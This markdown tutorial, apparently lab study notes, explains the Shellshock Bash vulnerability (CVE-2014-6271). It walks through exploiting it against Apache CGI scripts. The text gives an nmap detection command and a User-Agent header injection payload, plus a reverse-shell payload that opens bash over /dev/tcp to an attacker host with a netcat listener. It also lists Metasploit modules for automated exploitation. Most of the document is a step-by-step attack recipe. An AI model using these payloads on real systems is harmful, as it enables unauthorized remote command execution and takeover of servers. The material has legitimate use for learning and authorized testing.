
### What is it ? 

- Shellshock (CVE-2014-6271) is the name given to a family of vulnerabilities in the Bash shell (since V1.3) that allow an attacker to execute remote arbitrary commands via Bash in Linux based OS, consequently allowing the attacker to obtain remote access to the target system via a reverse shell.

- The Shellshock vulnerability was discovered by St√©phane Chazelas on the 12th of September 2014 and was made public on the 24th of September 2014.

- Bash is a Unix shell that is part of the GNU project and is the default shell for most Linux distributions. Windows doesn't utilise Bash, as it isn't a Unix based OS.

### How does it work ?

- The Shellshock vulnerability is caused by a vulnerability in Bash, whereby Bash mistakenly executes trailing commands after a series of characters: `() {:};.`

- This vulnerability only affects Linux as Windows does not use utilize Bash as it is not a `*Nix` based operating system.
 
- In the context of remote exploitation, Apache web servers configured to run CGI scripts or .sh scripts are also vulnerable to this attack.

- CGI (Common Gateway Interface) scripts are used by Apache to execute arbitrary commands on the Linux system, after which the output is displayed to the client. 

### How to exploit ?

* In order to exploit this vulnerability, you will need to locate an input vector or script that allows you to communicate with Bash.

* In the context of an Apache web server, we can utilize any legitimate CGI scripts accessible on the web server.

- Whenever a CGl script is executed, the web server will initiate a new process and run the CGI script with Bash.

- This vulnerability can be exploited both manually and automatically with the use of an `MSF` exploit module.

### Manual Exploitation

1. Use `ifconfig` to find the target IP address. The target is generally the IP after yours in the subnet.
2. Perform a `nmap` scan to check if the target is running a web server.
3. Check the source code of the website, see if it is running any `CGI` script.
4. If `CGI` script is found, then it means that the target is executing commands with bash.
5. Using `nmap` to find out if the target is vulnerable to `ShellShock` or not.
```
nmap -sV <target-ip> --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"
```
- The script arguments in this case are used to specify the CGI script we are testing.
- In this case, the CGI script is `gettime.cgi`.

6. If it is vulnerable, we can execute arbitrary commands by injecting malicious HTTP headers. We can  use `BurpSuite` to do this.
7. Open `BurpSuite` with default configurations.
8. Click Proxy, and make sure intercept is on, then click forward.
9. Reload the webpage `<target-ip>/gettime.cgi` and the request will be intercepted within the proxy.
10. Send the request to the repeater by right clicking.
11. Click on repeater and we'll now replace the User-Agent data with our malicious special characters, which will enable us to execute arbitrary commands. 
```
() { :; }; echo; echo; /bin/bash -c '<command>'
```
12. We can then click send, and it'll display the output of the command as a response.

### How to get a reverse shell manually ?

1. Use `netcat` to listen on a port.
```
nc -lnvp 1234
```
2. Open `BurpSuite` and replace the `User-Agent` with this-
```
() { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/<lhost>/1234 0>&1'
```
3. Switch back to your netcat listener, and we should get a reverse shell.

### Automatic Exploitation

1. Start up `msfconsole`
2. Module to scan if the webserver is vulnerable.
```
use auxiliary/scanner/http/apache_mod_cgi_bash_env
```
3. Module for exploitation.
```
use exploit/multi/http/apache_mod_cgi_bash_env_exec
```
4. Set `TARGETURI`. For example - `/gettime.cgi`
5. Run the exploit. This should provide us with a reverse shell.